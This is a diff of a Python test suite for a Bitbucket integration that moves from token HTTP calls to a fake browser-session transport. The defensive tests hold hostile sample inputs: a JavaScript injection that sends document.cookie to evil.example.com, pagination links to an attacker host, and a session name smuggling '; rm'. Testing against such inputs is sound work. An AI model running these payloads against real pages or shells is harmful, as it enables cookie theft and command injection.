@@ -1,42 +1,46 @@
-"""Bitbucket module: repository scoping, bypass and approvals, the pipelines file reader, log redaction, retries and
-the token rule, with a fake HTTP opener."""
+"""Bitbucket module: repository scoping, bypass and approvals, the pipelines file reader, log redaction, and the
+browser transport (the in-page fetch expression, Rastro's JSON, pagination, retries, an expired session), with a fake
+Rastro: no browser and no network."""
 from __future__ import annotations
 
-import base64
-import io
 import json
 import os
+import re
 import shutil
 import subprocess
 import sys
 import tempfile
 import unittest
-import urllib.error
 from pathlib import Path
 
 REPO = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(REPO / "modules" / "bitbucket"))
 import bitbucket as bb  # noqa: E402
 
-FAKE_TOKEN = "tok-" + "q" * 24  # built at runtime: a fake value, never a real token
 TOOLS = REPO / "modules" / "bitbucket" / "skill" / "tools"
-API = "https://api.bitbucket.org/2.0/repositories/acme"
+API = "/!api/2.0/repositories/acme"
 RUN = {"build_number": 41, "uuid": "{run-41}", "state": {"name": "IN_PROGRESS", "stage": {"name": "RUNNING"}},
        "target": {"ref_name": "develop", "selector": {"type": "custom", "pattern": "deploy-dev"},
                   "commit": {"hash": "abcdef1234567890"}}, "creator": {"display_name": "Clara Client"},
        "duration_in_seconds": 75}
+REQ_RE = re.compile(r"^  const req = (.*);$", re.M)
 
 
-class Resp(io.BytesIO):
-    def __enter__(self):
-        return self
-
-    def __exit__(self, *a):
-        return False
+def http_error(code, body="", retry_after=None, signed_in=True):
+    """What the page's fetch answers for an HTTP error."""
+    return {"__answer__": {"status": code, "type": "application/json", "text": body, "retryAfter": retry_after,
+                           "signedIn": signed_in}}
 
 
-def http_error(code, body="", headers=None):
-    return urllib.error.HTTPError(API, code, "err", headers or {}, io.BytesIO(body.encode()))
+def page_answer(**answer):
+    """Anything else the page script may return (a redirect, no CSRF cookie, a blocked fetch, the wrong page)."""
+    return {"__answer__": answer}
+
+
+def envelope(data=None, ok=True, message=""):
+    if ok:
+        return json.dumps({"schemaVersion": 1, "ok": True, "data": data})
+    return json.dumps({"schemaVersion": 1, "ok": False, "error": {"kind": "runtime", "message": message}})
 
 
 class BitbucketCase(unittest.TestCase):
@@ -54,15 +58,15 @@ class BitbucketCase(unittest.TestCase):
         self.patch("HOME", self.tmp)
         self.patch("SCOPES", self.tmp / "scopes.json")
         self.patch("CONFIG", self.tmp / "config.json")
-        self.calls, self.replies = [], []
-        self.patch("OPENER", self.opener)
+        self.calls, self.replies, self.commands = [], [], []
+        self.browser_running = True
+        self.patch("RASTRO", self.rastro)
         self.sleeps = []
         self.patch("SLEEP", self.sleeps.append)
-        for k in ("TANKA_UNATTENDED", "TANKA_CHAT", "TANKA_BITBUCKET_EMAIL"):
+        for k in ("TANKA_UNATTENDED", "TANKA_CHAT"):
             self.patch_env(k, None)
         self.patch_env("TANKA_BITBUCKET_WORKSPACE", "acme")
-        self.patch_env("TANKA_BITBUCKET_TOKEN_VAR", "BB_TEST_TOKEN")
-        self.patch_env("BB_TEST_TOKEN", FAKE_TOKEN)
+        self.patch_env("TANKA_BITBUCKET_SESSION", "bb-test")
         self.ws = self.tmp / "ws"
         (self.ws / ".claude" / "skills" / "approvals").mkdir(parents=True)
         self.patch_env("TANKA_WORKSPACE", str(self.ws))
@@ -86,17 +90,32 @@ class BitbucketCase(unittest.TestCase):
             os.environ[k] = v
         self.addCleanup(lambda: os.environ.pop(k, None) if old is None else os.environ.__setitem__(k, old))
 
-    def opener(self, req, timeout):
-        body = json.loads(req.data) if req.data else None
-        self.calls.append((req.get_method(), req.full_url, body, dict(req.header_items())))
+    def rastro(self, args, timeout):
+        """A fake `rastro -s <session> --json ...`: the session's state, and the page's answer to each fetch."""
+        self.assertEqual(args[0], "--json")
+        cmd = args[1]
+        self.commands.append(args[1:])
+        if cmd == "status":
+            state = "running" if self.browser_running else "stopped"
+            return 0, envelope([{"session": "other", "state": "running"}, {"session": "bb-test", "state": state}]), ""
+        if cmd == "open":
+            self.browser_running = True
+            return 0, envelope(None), ""
+        if cmd == "goto":
+            return 0, envelope(None), ""
+        self.assertEqual(cmd, "eval")
+        req = json.loads(REQ_RE.search(args[2]).group(1))
+        self.calls.append((req["method"], req["path"], req["body"], req["range"]))
         if not self.replies:
             raise AssertionError("unexpected network call")
         r = self.replies.pop(0)
-        if isinstance(r, Exception):
-            raise r
-        if isinstance(r, str):
-            return Resp(r.encode())
-        return Resp(json.dumps(r).encode() if r is not None else b"")
+        if isinstance(r, dict) and "__answer__" in r:
+            answer = r["__answer__"]
+        elif isinstance(r, str):
+            answer = {"status": 200, "type": "text/plain", "text": r}
+        else:
+            answer = {"status": 200, "type": "application/json", "text": json.dumps(r) if r is not None else ""}
+        return 0, envelope(json.dumps(answer)), ""
 
     def posts(self):
         return [c for c in self.calls if c[0] == "POST"]
@@ -267,10 +286,24 @@ class TestReads(BitbucketCase):
         with self.assertRaisesRegex(bb.ToolError, "name filter"):
             bb.repos("work", 'x" OR slug ~ "')
 
-    def test_next_links_are_followed_only_inside_the_api(self):
-        self.replies = [{"values": [{"slug": "a"}], "next": "https://evil.example.com/steal"}, {"values": [{"slug": "b"}]}]
+    def test_next_links_become_same_origin_paths_and_foreign_ones_are_not_followed(self):
+        nxt = "https://bitbucket.org/!api/2.0/repositories/acme?pagelen=50&page=2"
+        self.replies = [{"values": [{"slug": "a"}], "next": nxt}, {"values": [{"slug": "b"}]}]
+        self.assertIn("2 repositories", bb.repos("everything", limit=5))
+        self.assertEqual(self.calls[1][1], "/!api/2.0/repositories/acme?pagelen=50&page=2")
+        self.assertEqual(bb.next_path("https://api.bitbucket.org/2.0/repositories/acme?page=3"),
+                         "/!api/2.0/repositories/acme?page=3")
+        for foreign in ("https://evil.example.com/!api/2.0/x", "https://bitbucket.org.evil.example.com/!api/x",
+                        "https://bitbucket.org/account/signin/", None, 5):
+            self.assertIsNone(bb.next_path(foreign))
+        self.calls = []
+        self.replies = [{"values": [{"slug": "a"}], "next": "https://evil.example.com/steal"}]
         bb.repos("everything", limit=5)
-        self.assertTrue(self.calls[1][1].startswith("https://api.bitbucket.org/2.0"))
+        self.assertEqual(len(self.calls), 1)
+        with self.assertRaisesRegex(bb.ToolError, "outside bitbucket.org"):
+            bb.request("GET", "https://evil.example.com/steal")
+        with self.assertRaisesRegex(bb.ToolError, "outside bitbucket.org"):
+            bb.request("GET", "//evil.example.com/steal")
 
     def test_commits(self):
         self.replies = [{"values": [{"hash": "0123456789abcdef", "date": "2026-03-04T05:06:07+00:00",
@@ -288,22 +321,23 @@ class TestReads(BitbucketCase):
         self.assertIn("sort=-created_on", self.calls[0][1])
 
     def test_steps_and_a_redacted_log_tail(self):
+        fake_token = "tok-" + "q" * 24  # built at runtime: a fake value, never a real token
         steps = {"values": [{"uuid": "{s1}", "name": "Build", "state": {"name": "COMPLETED", "result": {"name": "SUCCESSFUL"}},
                              "duration_in_seconds": 30},
                             {"uuid": "{s2}", "name": "Deploy", "state": {"name": "COMPLETED", "result": {"name": "FAILED"}},
                              "duration_in_seconds": 5}]}
         log = "\n".join([f"line {i}" for i in range(400)] + [
-            f"export API_TOKEN={FAKE_TOKEN}", "curl -H 'Authorization: Bearer abcdefghijklmnop'",
+            f"export API_TOKEN={fake_token}", "curl -H 'Authorization: Bearer abcdefghijklmnop'",
             "push https://deployer:xxxx-fake-pass@git.example.com/x.git", "password: s3cr3t-value", "ERROR deploy failed"])
         self.replies = [RUN, steps, log]
         out = bb.pipelines("work", "api-orders", build_number=41, step="deploy")
         self.assertIn("2 | Deploy | COMPLETED/FAILED | 5s", out)
         self.assertIn("ERROR deploy failed", out)
         self.assertIn("last 150 line(s)", out)
-        for secret in (FAKE_TOKEN, "abcdefghijklmnop", "xxxx-fake-pass", "s3cr3t-value"):
+        for secret in (fake_token, "abcdefghijklmnop", "xxxx-fake-pass", "s3cr3t-value"):
             self.assertNotIn(secret, out)
         self.assertEqual(self.calls[2][1], f"{API}/api-orders/pipelines/%7Brun-41%7D/steps/%7Bs2%7D/log")
-        self.assertEqual(self.calls[2][3].get("Range"), f"bytes=-{bb.LOG_BYTES}")
+        self.assertEqual(self.calls[2][3], f"bytes=-{bb.LOG_BYTES}")
         self.assertLessEqual(len(out), bb.MAX_OUTPUT)
         self.replies = [RUN, steps, log]
         grepped = bb.pipelines("work", "api-orders", build_number=41, step="2", grep="error")
@@ -333,43 +367,131 @@ class TestReads(BitbucketCase):
         self.assertEqual(self.calls[2][1], f"{API}/api-billing/src/{'f' * 40}/bitbucket-pipelines.yml")
 
 
-class TestHttp(BitbucketCase):
+class TestTransport(BitbucketCase):
+    def test_the_fetch_expression_carries_every_value_as_json_never_spliced(self):
+        nasty = 'x"); fetch("https://evil.example.com/" + document.cookie); ("\u2028</script>'
+        req = {"method": "POST", "path": "/!api/2.0/repositories/acme/" + nasty, "body": {"note": nasty, "n": 1},
+               "raw": False, "range": None}
+        expr = bb.fetch_expr(req)
+        self.assertTrue(expr.startswith("(async () => {") and expr.endswith("})()"))
+        self.assertEqual(json.loads(REQ_RE.search(expr).group(1)), req)  # the literal decodes to exactly the request
+        self.assertNotIn(nasty, expr)  # its quotes are escaped, so it cannot close the string
+        self.assertNotIn("\u2028", expr)  # ASCII only
+        self.assertIn('const origin = "https://bitbucket.org";', expr)
+        self.assertIn('redirect: req.raw ? "follow" : "manual"', expr)  # a log's signed file URL; never a sign-in
+        self.assertIn("csrftoken", expr)  # read inside the page; nothing in Python ever holds it
+
+    def test_rastro_json_is_parsed_and_its_errors_are_relayed(self):
+        self.assertEqual(bb.parse_rastro("noise\n" + envelope('{"a": 1}') + "\n", "", "eval"), '{"a": 1}')
+        with self.assertRaisesRegex(bb.ToolError, r"Rastro failed \(eval\): no browser open"):
+            bb.parse_rastro(envelope(ok=False, message="no browser open"), "Error: no browser open", "eval")
+        with self.assertRaisesRegex(bb.ToolError, "no readable answer to eval \\(boom\\)"):
+            bb.parse_rastro("", "boom", "eval")
+        with self.assertRaisesRegex(bb.ToolError, "no readable answer"):
+            bb.parse_rastro("not json", "", "eval")
+
+    def test_the_session_is_opened_headless_allowed_to_write_to_bitbucket_only(self):
+        self.browser_running = False
+        self.replies = [{"values": []}]
+        bb.commits("work", "api-orders")
+        opens = [c for c in self.commands if c[0] == "open"]
+        self.assertEqual(opens, [["open", "https://bitbucket.org/", "--allow-write", "bitbucket.org"]])
+        self.assertNotIn("--headed", sum(self.commands, []))
+
+    def test_a_post_restates_the_write_permission_on_a_running_session(self):
+        self.replies = [{"build_number": 5}]
+        bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
+        self.assertIn(["open", "--allow-write", "bitbucket.org"], self.commands)
+        self.commands = []
+        self.replies = [{"values": []}]
+        bb.commits("work", "api-orders")  # a read changes no permission of a session someone else may share
+        self.assertEqual([c[0] for c in self.commands], ["status", "eval"])
+
     def test_retries_honour_retry_after_then_give_up(self):
-        self.replies = [http_error(429, headers={"Retry-After": "3"}), {"values": []}]
+        self.replies = [http_error(429, retry_after="3"), {"values": []}]
         bb.commits("work", "api-orders")
         self.assertEqual(self.sleeps, [3.0])
         self.replies = [http_error(503) for _ in range(4)]
         with self.assertRaisesRegex(bb.ToolError, "HTTP 503"):
             bb.commits("work", "api-orders")
 
-    def test_basic_with_an_email_and_bearer_without(self):
-        self.replies = [{"values": []}]
-        bb.commits("work", "api-orders")
-        self.assertEqual(self.calls[0][3]["Authorization"], f"Bearer {FAKE_TOKEN}")
-        self.patch_env("TANKA_BITBUCKET_EMAIL", "someone@example.com")
-        self.replies = [{"values": []}]
-        bb.commits("work", "api-orders")
-        expected = base64.b64encode(f"someone@example.com:{FAKE_TOKEN}".encode()).decode()
-        self.assertEqual(self.calls[1][3]["Authorization"], f"Basic {expected}")
+    def test_an_expired_session_says_to_log_in_and_not_retry(self):
+        for answer in (http_error(401), http_error(403, signed_in=False), page_answer(status=0, redirect=True),
+                       page_answer(status=200, type="text/html; charset=utf-8", text="<html>Log in</html>"),
+                       http_error(404, "<html>not found</html>", signed_in=False)):  # signed out, a private repo
+            self.replies = [answer]
+            with self.assertRaises(bb.ToolError) as cm:
+                bb.commits("work", "api-orders")
+            self.assertEqual(str(cm.exception), bb.EXPIRED)
+        self.assertIn("tanka bitbucket login", bb.EXPIRED)
+        self.assertIn("do not retry", bb.EXPIRED)
+        self.replies = [http_error(403, json.dumps({"error": {"message": "Forbidden"}}), signed_in=True)]
+        with self.assertRaisesRegex(bb.ToolError, "HTTP 403: Forbidden. The signed-in account may not do that"):
+            bb.commits("work", "api-orders")
+        self.replies = [http_error(404, json.dumps({"error": {"message": "Not found"}}), signed_in=True)]
+        with self.assertRaisesRegex(bb.ToolError, "HTTP 404: Not found. Check the name"):
+            bb.commits("work", "api-orders")
 
-    def test_token_never_in_errors_and_missing_settings_are_named(self):
-        self.replies = [http_error(401, json.dumps({"error": {"message": f"bad {FAKE_TOKEN}"}}))]
-        with self.assertRaises(bb.ToolError) as cm:
+    def test_a_tab_off_bitbucket_is_brought_back_once_then_called_expired(self):
+        self.replies = [page_answer(wrongPage=True), {"values": []}]
+        self.assertIn("0 commits", bb.commits("work", "api-orders"))
+        self.assertIn(["goto", "https://bitbucket.org/account/settings/"], self.commands)
+        self.replies = [page_answer(wrongPage=True), page_answer(wrongPage=True)]  # sign-in page after the goto
+        with self.assertRaisesRegex(bb.ToolError, "session has expired"):
             bb.commits("work", "api-orders")
-        self.assertNotIn(FAKE_TOKEN, str(cm.exception))
-        self.assertIn("lacks access", str(cm.exception))
-        self.patch_env("BB_TEST_TOKEN", None)
-        with self.assertRaisesRegex(bb.ToolError, "token is not set"):
+
+    def test_a_blocked_write_or_a_missing_csrf_cookie_is_a_clear_error_and_nothing_retries(self):
+        self.replies = [page_answer(failed="TypeError: Failed to fetch")]
+        with self.assertRaisesRegex(bb.ToolError, "Rastro blocks writes .* must allow bitbucket.org. Nothing was run"):
+            bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
+        self.replies = [page_answer(noCsrf=True)]
+        with self.assertRaisesRegex(bb.ToolError, "no CSRF cookie, so nothing was run"):
+            bb.run_pipeline("work", "api-orders", "main", "deploy-dev")
+        self.replies = [page_answer(failed="TypeError: Failed to fetch")]
+        with self.assertRaisesRegex(bb.ToolError, "Could not reach Bitbucket from the browser session"):
             bb.commits("work", "api-orders")
+        self.assertEqual(self.sleeps, [])
+
+    def test_another_assistant_holding_the_session_makes_it_wait_then_give_up(self):
+        import fcntl
+        self.patch("LOCK_WAIT", 0)
+        lock = self.tmp / ".bb-test.lock"
+        lock.touch()
+        with lock.open() as fh:
+            fcntl.flock(fh, fcntl.LOCK_EX)
+            with self.assertRaisesRegex(bb.ToolError, "Another assistant is using Bitbucket"):
+                bb.commits("work", "api-orders")
+        self.assertEqual(self.calls, [])
+
+    def test_status_says_whether_the_session_is_open_and_signed_in(self):
+        sys.path.insert(0, str(REPO / "modules" / "bitbucket"))
+        import cli
+        self.replies = [{"display_name": "Clara Client", "uuid": "{u}"}]
+        self.assertEqual(cli.session_text(), ("Session bb-test: open, signed in as Clara Client", True))
+        self.assertEqual(self.calls[0][:2], ("GET", "/!api/2.0/user"))
+        self.replies = [http_error(401)]
+        line, ok = cli.session_text()
+        self.assertFalse(ok)
+        self.assertIn("session has expired", line)
+        self.browser_running = False
+        line, ok = cli.session_text()
+        self.assertTrue(ok)
+        self.assertIn("not open", line)
+        self.assertNotIn("open", [c[0] for c in self.commands])  # status never starts a browser
+
+    def test_missing_settings_are_named_and_the_file_fills_in(self):
         self.patch_env("TANKA_BITBUCKET_WORKSPACE", None)
         with self.assertRaisesRegex(bb.ToolError, "workspace not set"):
             bb.commits("work", "api-orders")
-
-    def test_the_settings_file_supplies_what_the_environment_does_not(self):
-        self.patch_env("TANKA_BITBUCKET_WORKSPACE", None)
-        (self.tmp / "config.json").write_text(json.dumps({"workspace": "other-team", "token_var": "IGNORED"}))
+        self.patch_env("TANKA_BITBUCKET_SESSION", None)
+        (self.tmp / "config.json").write_text(json.dumps({"workspace": "other-team", "session": "bb-file"}))
         self.assertEqual(bb.config()["workspace"], "other-team")
-        self.assertEqual(bb.token_var(), "BB_TEST_TOKEN")  # the environment wins
+        self.assertEqual(bb.session_name(), "bb-file")
+        self.patch_env("TANKA_BITBUCKET_SESSION", "bb-env")
+        self.assertEqual(bb.session_name(), "bb-env")  # the environment wins
+        self.patch_env("TANKA_BITBUCKET_SESSION", "-x; rm")
+        with self.assertRaisesRegex(bb.ToolError, "not a Rastro session name"):
+            bb.session_name()
 
 
 class TestTools(unittest.TestCase):
@@ -382,7 +504,15 @@ class TestTools(unittest.TestCase):
     def test_install_and_checks(self):
         tmp = Path(tempfile.mkdtemp())
         self.addCleanup(shutil.rmtree, tmp)
-        env = dict(os.environ, TANKA_WORKSPACES=str(tmp / "workspaces"), TANKA_BITBUCKET_HOME=str(tmp / "home"))
+        # A fake rastro on PATH: the session is not running, and nothing may start a browser.
+        fake = tmp / "bin"
+        fake.mkdir()
+        (fake / "rastro").write_text("#!/bin/sh\n"
+                                     "case \"$*\" in *status*) echo '{\"schemaVersion\":1,\"ok\":true,\"data\":[]}';;\n"
+                                     "*) echo 'unexpected' >&2; exit 1;; esac\n")
+        (fake / "rastro").chmod(0o755)
+        env = dict(os.environ, TANKA_WORKSPACES=str(tmp / "workspaces"), TANKA_BITBUCKET_HOME=str(tmp / "home"),
+                   TANKA_BITBUCKET_SESSION="bb-test", PATH=f"{fake}{os.pathsep}{os.environ.get('PATH', '')}")
         tanka = lambda *a: subprocess.run([str(REPO / "bin" / "tanka"), *a], capture_output=True, text=True, env=env)
         tanka("init", "deploys", "--strict")  # modules must fit the strict budget
         p = tanka("install", "bitbucket", "deploys")
@@ -395,6 +525,7 @@ class TestTools(unittest.TestCase):
         st = tanka("bitbucket", "status")
         self.assertEqual(st.returncode, 0, st.stderr)
         self.assertIn("api-orders", st.stdout)
+        self.assertIn("Session bb-test: not open", st.stdout)
 
 
 class TestEndToEnd(BitbucketCase):
@@ -410,9 +541,11 @@ class TestEndToEnd(BitbucketCase):
         self.assertEqual(tanka("install", "bitbucket", "deploys").returncode, 0)
         tool = ws / ".claude" / "skills" / "bitbucket" / "tools"
         args = {"repo": "api-orders", "ref": "main", "pipeline": "deploy-prod"}
-        # An unreachable proxy: any network call would fail the tool, so success proves none was made.
+        # No rastro on PATH: any browser call would fail the tool, so success proves none was made.
+        empty = self.tmp / "no-bin"
+        empty.mkdir()
         run_env = dict(env, TANKA_WORKSPACE=str(ws), TANKA_TOOL="bitbucket_run_pipeline",
-                       TANKA_PLUGIN_DIR=str(REPO / "plugin"), HTTPS_PROXY="http://127.0.0.1:9")
+                       TANKA_PLUGIN_DIR=str(REPO / "plugin"), PATH=str(empty))
         p = subprocess.run([sys.executable, str(tool / "bitbucket_run_pipeline.py")], input=json.dumps(args),
                            capture_output=True, text=True, cwd=tool, env=run_env)
         self.assertEqual(p.returncode, 0, p.stderr)
@@ -432,32 +565,37 @@ class TestEndToEnd(BitbucketCase):
         skill = ws / ".claude" / "skills" / "bitbucket"
         skill.mkdir(parents=True)
         (skill / "approve.py").write_text((TOOLS.parent / "approve.py").read_text().replace("__SCOPE__", "reader"))
-        # approve.py imports the real module in its own process; a small shim records the POST instead of sending it.
+        # approve.py imports the real module in its own process; a small shim stands in for Rastro and records the
+        # page's fetch instead of sending it.
         shim = self.tmp / "shim"
         shim.mkdir()
         (shim / "sitecustomize.py").write_text(
-            "import json, os, sys\n"
+            "import json, os, re, sys\n"
             f"sys.path.insert(0, {str(REPO / 'modules' / 'bitbucket')!r})\n"
-            "import bitbucket, io\n"
-            "class R(io.BytesIO):\n"
-            "    def __enter__(self): return self\n"
-            "    def __exit__(self, *a): return False\n"
-            "def opener(req, timeout):\n"
+            "import bitbucket\n"
+            "def fake(args, timeout):\n"
             "    with open(os.environ['BB_CALLS'], 'a') as f:\n"
-            "        f.write(json.dumps([req.get_method(), req.full_url, json.loads(req.data or 'null')]) + '\\n')\n"
-            "    return R(b'{\"build_number\": 77}')\n"
-            "bitbucket.OPENER = opener\n")
+            "        if args[1] == 'eval':\n"
+            "            req = json.loads(re.search(r'^  const req = (.*);$', args[2], re.M).group(1))\n"
+            "            f.write(json.dumps([req['method'], req['path'], req['body']]) + '\\n')\n"
+            "            data = json.dumps({'status': 201, 'type': 'application/json', 'text': '{\"build_number\": 77}'})\n"
+            "        else:\n"
+            "            f.write(json.dumps(args[1:]) + '\\n')\n"
+            "            data = [{'session': 'bitbucket', 'state': 'running'}] if args[1] == 'status' else None\n"
+            "    return 0, json.dumps({'schemaVersion': 1, 'ok': True, 'data': data}), ''\n"
+            "bitbucket.RASTRO = fake\n")
         calls = self.tmp / "calls.jsonl"
         env = dict(os.environ, TANKA_PLUGIN_DIR=str(REPO / "plugin"), TANKA_BITBUCKET_HOME=str(self.tmp),
-                   PYTHONPATH=str(shim), BB_CALLS=str(calls))
+                   PYTHONPATH=str(shim), BB_CALLS=str(calls), TANKA_BITBUCKET_SESSION="bitbucket")
         payload = {"tool": "bitbucket_run_pipeline", "args": {"repo": "api-orders", "ref": "main", "pipeline": "deploy-prod"}}
         p = subprocess.run([sys.executable, str(skill / "approve.py")], input=json.dumps({"id": "a-1", "payload": payload}),
                            capture_output=True, text=True, env=env, cwd=ws)
         self.assertEqual(p.returncode, 0, p.stderr)
         self.assertIn("Started pipeline #77", p.stdout)
         sent = [json.loads(line) for line in calls.read_text().splitlines()]
-        self.assertEqual([c[:2] for c in sent], [["POST", f"{API}/api-orders/pipelines/"]])
-        self.assertEqual(sent[0][2]["target"]["selector"], {"type": "custom", "pattern": "deploy-prod"})
+        self.assertEqual(sent[:2], [["status"], ["open", "--allow-write", "bitbucket.org"]])
+        self.assertEqual([c[:2] for c in sent[2:]], [["POST", f"{API}/api-orders/pipelines/"]])
+        self.assertEqual(sent[2][2]["target"]["selector"], {"type": "custom", "pattern": "deploy-prod"})
 
 
 if __name__ == "__main__":
